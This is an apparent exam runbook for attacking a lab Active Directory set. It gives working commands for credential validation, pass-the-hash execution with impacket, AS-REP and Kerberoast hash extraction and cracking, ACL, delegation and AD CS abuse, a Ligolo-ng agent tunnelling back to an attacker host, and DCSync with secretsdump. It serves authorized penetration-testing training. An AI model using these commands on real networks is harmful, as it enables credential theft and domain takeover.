# Active Directory Set Methodology

Exam runbook for a three-target AD set. Assume OffSec provides an initial username/password (or hash); do not assume it is domain-admin, valid on every host, or sufficient for remote execution. Replace placeholders, stay inside exam scope, and keep a contemporaneous evidence log.

## 0. Build the target and credential ledger

Label the three in-scope machines `T1` (first foothold), `T2` (member/jump server), and `T3` (likely DC) until enumeration proves their roles. Do not assume their IP order or that all hosts are directly reachable.

| Item | Record |
|---|---|
| Target/IP/hostname | T1, T2, T3 and all discovered aliases |
| Domain/DC | DNS domain, NetBIOS domain, DC FQDN/IP, time source |
| Credentials | supplied/found username, domain/local context, password/hash, source, hosts tested |
| Access | protocol, privilege, proof, flags captured |
| Network | attacker VPN IP, host interfaces, routes, newly discovered subnets |

Create a separate directory and scan log per target. Keep exact command output that explains why each exploitation step was selected. Confirm the exam's current rules before using any exploit framework or making changes that affect other users/services.

## 1. Establish reachability and identify roles

Start with all three known IPs. Save full TCP scans; run UDP top-ports where useful. Re-scan discovered hostnames and newly discovered internal hosts.

```bash
export T1=<target1-ip> T2=<target2-ip> T3=<target3-ip>
mkdir -p ~/oscp/ad-set/{T1,T2,T3,loot}
nmap -Pn -n -p- --min-rate 3000 -oN ~/oscp/ad-set/T1/tcp-all.txt "$T1"
nmap -Pn -n -sC -sV -p <open-ports> -oN ~/oscp/ad-set/T1/tcp-services.txt "$T1"
sudo nmap -Pn -n -sU --top-ports 100 -oN ~/oscp/ad-set/T1/udp-top.txt "$T1"
```

Repeat for T2 and T3. Treat scan-rate flags as adjustable if packet loss or a fragile service makes results unreliable. Prioritize SMB/RPC, LDAP/Kerberos/DNS, WinRM/RDP, web, database, and any unusual service. Check DNS records, SMB/RPC null access, anonymous LDAP, and share contents before assuming credentials are needed.

Once the domain/DC is identified, add its FQDN and hostname to your local hosts file and use the FQDN for Kerberos operations. Synchronize time with the DC if Kerberos reports clock skew.

**Decision:** no direct foothold from the supplied credential? Enumerate the exposed services and readable shares on all three targets, then return to credentialed validation after every new secret. Use [Initial Foothold](initial-foothold.md) for service-specific initial access; this document owns AD credential progression and lateral movement.

## 2. Validate the supplied credential safely

Try the supplied identity against each in-scope host and relevant service before assuming it is domain-wide. Determine whether it is a domain or local account. First check the domain lockout policy; avoid broad password spraying unless permitted and justified by evidence.

```bash
nxc smb <host-or-in-scope-range> -d <domain> -u <user> -p '<password>'
nxc smb <host> -d <domain> -u <user> -p '<password>' --shares
nxc ldap <dc-ip> -d <domain> -u <user> -p '<password>'
nxc winrm <host> -d <domain> -u <user> -p '<password>'
```

If you have an NT hash, validate it with `-H <NT-hash>` where supported. If login reports `STATUS_PASSWORD_MUST_CHANGE`, record the result and use the authorized password-change route in [Password Spraying](Active%20Directory/Password%20Spraying.md) or [Other AD Abuse](Active%20Directory/Other.md); do not repeatedly retry the expired password. A valid SMB login does not by itself prove remote command execution.

## 3. Get a first shell and capture the user flag

Use the least disruptive access path the evidence supports: web/app RCE, WinRM, RDP, or an authorized SMB/DCOM execution method with sufficient rights. For Impacket commands, use the installed `impacket-...` entry-point syntax:

```bash
impacket-psexec '<domain>/<user>:<password>'@<host>
impacket-wmiexec '<domain>/<user>:<password>'@<host>
impacket-GetTGT '<domain>/<user>:<password>' -dc-ip <dc-ip>
```

If the foothold is the XAMPP host described in your notes, inspect the SMB share for `C:\xampp\passwords.txt`, `phpMyAdmin\config.inc.php`, `mysql\bin\my.ini`, Apache configuration, and application config files. Test recovered credentials against the local MySQL service first if it is bound to loopback. Confirm `FILE` privilege, `secure_file_priv`, and the actual document root before considering `SELECT ... INTO OUTFILE`; verify the resulting shell identity rather than assuming it is SYSTEM. If it is not high privilege, follow [Windows Privilege Escalation](winfows-pe.md).

On each newly obtained interactive foothold:

1. Record hostname, current user, groups/privileges, OS/build, interfaces, routes, and listening services.
2. Find the exam's user-level flag (`local.txt` or the path specified by the exam) and record the exact contents in your evidence log. Do this immediately; do not wait for privilege escalation.
3. Run the matching local PE runbook in [Windows Privilege Escalation](winfows-pe.md) or [Linux Privilege Escalation](linux-pe.md).
4. After each successful PE, immediately locate and capture that target's elevated flag (`proof.txt`, `root.txt`, or the exam-specified equivalent), record the elevated identity and evidence, and only then pivot onward.

A flag capture is not proof that the next target is compromised. Keep per-target proof separate.

## 4. Credentialed AD enumeration

Run collection as soon as any valid domain credential is available. Save raw output; mark the current principal as owned in BloodHound CE and inspect shortest paths from owned principals to high-value groups/computers. Use `rusthound-ce` for collection.

```bash
rusthound-ce --domain <domain> -u <user> -p '<password>' -z
nxc smb <dc-ip> -d <domain> -u <user> -p '<password>' --users
nxc smb <dc-ip> -d <domain> -u <user> -p '<password>' --groups
nxc smb <dc-ip> -d <domain> -u <user> -p '<password>' --shares
nxc smb <dc-ip> -d <domain> -u <user> -p '<password>' -M spider_plus
ldapdomaindump -u '<domain>\\<user>' -p '<password>' <dc-ip>
```

Check, in this order:

- User descriptions/attributes, SYSVOL and NETLOGON scripts, GPP `cpassword`, accessible shares, backup/config/history files, and credentials stored on every host.
- AS-REP roastable users; request/crack only hashes obtained from in-scope accounts.
- Kerberoastable SPNs, prioritizing service accounts with useful group membership or host access.
- BloodHound ACL edges: `GenericAll`, `GenericWrite`, `WriteDacl`, `WriteOwner`, `ForceChangePassword`, `AddMember`, `WriteSPN`, `AddKeyCredentialLink`, `ReadLAPSPassword`, `ReadGMSAPassword`, and replication rights.
- Delegation attributes and AD CS/CA/template misconfiguration.
- Local-admin/logged-on-user access and credential reuse across the three hosts.

Representative roasting commands:

```bash
impacket-GetNPUsers '<domain>/' -usersfile users.txt -dc-ip <dc-ip> -no-pass -format hashcat -outputfile asrep.txt
impacket-GetUserSPNs '<domain>/<user>:<password>' -dc-ip <dc-ip> -request -outputfile kerberoast.txt
hashcat -m 18200 asrep.txt <wordlist>
hashcat -m 13100 kerberoast.txt <wordlist>
```

Check password policy before spraying. Prefer one known, evidence-based candidate at a time; stop on a confirmed credential and validate it across the three hosts and relevant protocols. Do not assume a cracked service-account password is a user password, or a local Administrator credential is a domain credential.

## 5. Turn each AD finding into a tested path

Use enumeration output to choose a specific branch; avoid blind changes. After each successful hop, rerun the relevant enumeration and graph analysis because ownership and group membership can expose new edges.

| Finding | Next action |
|---|---|
| User/group ACL edge | Apply the matching minimal abuse from [ACL Abuse](Active%20Directory/ACL%20Abuse.md); confirm the changed access, then re-collect/re-analyze. |
| Delegation attribute or ACL to a computer | Follow the matching unconstrained, constrained, or RBCD chain in [Delegation Abuse](Active%20Directory/Delegation%20Abuse.md). Use `impacket-addcomputer`, `impacket-rbcd`, and `impacket-getST` syntax where relevant. |
| Certificate authority/template or vulnerable ESC path | Run `certipy-ad find -vulnerable` and follow the matching branch in [AD CS Certificates](Active%20Directory/Certificates.md). |
| Writable GPO or GPO-linked target | Verify which OU/computers it affects and use [GPO Abuse](Active%20Directory/GPO%20Abuse.md); allow for policy refresh and verify effect. |
| LAPS/gMSA read access | Retrieve only the permitted target password/hash, then authenticate to that specific computer/account and continue enumeration. |
| Replication rights or Domain Admin credential | Validate access; use DCSync as the domain-compromise path if justified. A DC shell is not required just to prove DCSync. |
| MSSQL or another internal service | Re-enumerate and follow the service-specific path in [Common Ports](Enumeration/Common%20Ports.md), [Common Ports II](Enumeration/Common%20Ports%20II.md), or [PostgreSQL](Enumeration/PostgreSQL.md). |

For example, the common ACL-to-RBCD chain is: verify the exact write right on the target computer object, create or use a controlled SPN principal if permitted, set RBCD, request a service ticket as the intended privileged identity, then use that ticket only against the allowed target/service. Keep the target FQDN, SPN, ticket cache, and resulting access in the log.

## 6. Pivot through the AD set with Ligolo-ng

Use Ligolo-ng for the AD-set internal network pivot. Identify the compromised host's additional interfaces/subnets with `ipconfig /all`, `route print`, `ip addr`, or `ip route`; do not infer the pivot subnet from a single interface. Start the proxy on the attacker and connect an agent from the compromised host.

```bash
# Attacker; make the TUN interface once, then bring it up
sudo ip tuntap add user "$USER" mode tun ligolo
sudo ip link set ligolo up
sudo ligolo-proxy -selfcert
```

```powershell
# Compromised Windows host; transfer the agent using an allowed method first
.\agent.exe -connect <attacker-vpn-ip>:11601 -ignore-cert
```

In the Ligolo console, select the session, inspect the agent interfaces, start the tunnel on the `ligolo` interface, and add the discovered internal subnet route on the attacker. Syntax varies slightly by Ligolo-ng release; verify with `help` and `ip route` rather than pasting a route blindly.

```text
session
ifconfig
start --tun ligolo
```

```bash
sudo ip route add <internal-subnet>/<prefix> dev ligolo
ip route
nmap -Pn -n -p- <new-internal-host>
nxc smb <new-internal-host> -d <domain> -u <user> -p '<password>' --shares
```

Rescan only in-scope addresses, then enumerate the new host from the attacker through the tunnel. Check its shares and local flags, hunt for PSReadLine history, mRemoteNG `confCons.xml`, XAMPP/app secrets, saved sessions, SAM/SYSTEM/SECURITY backups, and active privileged sessions. Repeat the route/scan/credential loop if a second internal segment is genuinely reachable through another compromised host. See [Pivoting and Port Forwarding](Lateral%20Movement/Pivoting%20%26%20Port%20Forwarding.md) for multi-hop setup details.

## 7. Lateral movement and local escalation loop

For each newly discovered host, follow the same loop rather than jumping straight to the DC:

1. Validate each recovered password/hash/ticket against SMB, LDAP, WinRM, RDP, and discovered services; record local vs domain context.
2. Enumerate authenticated shares, SYSVOL/NETLOGON, descriptions, sessions, services, and local privilege level.
3. If local admin or a relevant privilege is confirmed, run the Windows PE checklist; after successful PE, capture that host's elevated flag immediately.
4. Re-run `rusthound-ce` and path analysis after credentials, group membership, ACL, delegation, or certificate changes.
5. Test the next shortest evidenced path to T2/T3. Keep T3/DC confirmation distinct from merely obtaining a DA hash or DCSync output.

For hash-based Windows access, validate SMB first, then use an authorized execution method if rights support it:

```bash
nxc smb <host> -d <domain> -u <user> -H <nt-hash>
impacket-wmiexec '<domain>/<user>@<host>' -hashes ':<nt-hash>'
impacket-psexec '<domain>/<user>@<host>' -hashes ':<nt-hash>'
```

If a TGT or service ticket is used, preserve the ticket cache and exact principal/SPN. Do not forge persistent tickets or add durable accounts unless the exam explicitly requires it. Remove temporary ACL/RBCD/SPN/account changes when safe and permitted, and record what was changed.

## 8. Domain-compromise verification and final flag sweep

When you have a justified DA-equivalent credential or replication rights, verify it against the DC. Use `impacket-secretsdump` for authorized DCSync; use a shell only if the path and privileges provide it.

```bash
impacket-secretsdump '<domain>/<user>:<password>'@<dc-ip> -just-dc
# Or with an NT hash:
impacket-secretsdump '<domain>/<user>@<dc-ip>' -hashes ':<nt-hash>' -just-dc
```

After every successful privilege escalation on T1, T2, and T3, confirm the new identity and capture that target's elevated flag before continuing. At the end, reconcile the three-target table: user flag and elevated flag status per host, exact proof source, hashes/tickets used, paths verified, and any untouched target. Do not report a flag as captured merely because a command returned success; read and record the flag itself.

## Source notes

- [Active Directory Methodology](Active%20Directory/Active%20Directory%20Methodology.md)
- [AD Attack Paths and Set Reconstructions](Active%20Directory/Attack%20Paths.md)
- [ACL Abuse](Active%20Directory/ACL%20Abuse.md)
- [Delegation Abuse](Active%20Directory/Delegation%20Abuse.md)
- [AD CS Certificates](Active%20Directory/Certificates.md)
- [AD Credential Hunting](Active%20Directory/Credential%20Hunting.md)
- [GPO Abuse](Active%20Directory/GPO%20Abuse.md)
- [Other AD Abuse](Active%20Directory/Other.md)
- [Password Spraying](Active%20Directory/Password%20Spraying.md)
- [Roasting](Active%20Directory/Roasting.md)
- [Privilege Abuse and SeBackupPrivilege](Active%20Directory/Privilege%20Abuses.md)
- [SMB Enumeration](Enumeration/SMB%20Enumeration.md)
- [Common Ports](Enumeration/Common%20Ports.md)
- [Common Ports II](Enumeration/Common%20Ports%20II.md)
- [Port Scanning](Enumeration/Port%20Scanning.md)
- [File Transfers](File%20Transfers/File%20Transfers.md)
- [Windows Foothold](Initial%20Foothold/Windows%20Foothold.md)
- [Windows Persistence](Persistence/Windows%20Persistence.md)
- [Windows Lateral Movement](Lateral%20Movement/Windows.md)
- [Pivoting and Port Forwarding](Lateral%20Movement/Pivoting%20%26%20Port%20Forwarding.md)
- [Windows Privilege Escalation](winfows-pe.md)
- [Initial Foothold](initial-foothold.md)
